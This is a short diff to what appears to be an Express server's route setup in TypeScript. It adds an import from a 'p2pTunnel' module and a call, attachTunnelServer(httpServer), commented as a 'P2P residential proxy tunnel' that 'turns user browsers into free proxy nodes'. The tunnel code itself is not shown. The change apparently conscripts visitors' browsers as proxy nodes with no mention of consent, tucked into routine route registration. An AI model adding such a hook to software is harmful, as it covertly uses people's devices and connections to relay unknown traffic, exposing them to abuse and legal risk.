@@ -20,6 +20,7 @@ import {
 } from "./routes/index";
 import { registerShareRoutes } from './routes/share';
 import { registerExtractorRoutes } from './routes/extractor';
+import { attachTunnelServer } from './p2pTunnel';
 
 /**
  * Shared session store for the application.
@@ -190,5 +191,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   const httpServer = createServer(app);
+  // Attach P2P residential proxy tunnel — turns user browsers into free proxy nodes
+  attachTunnelServer(httpServer);
   return httpServer;
 }
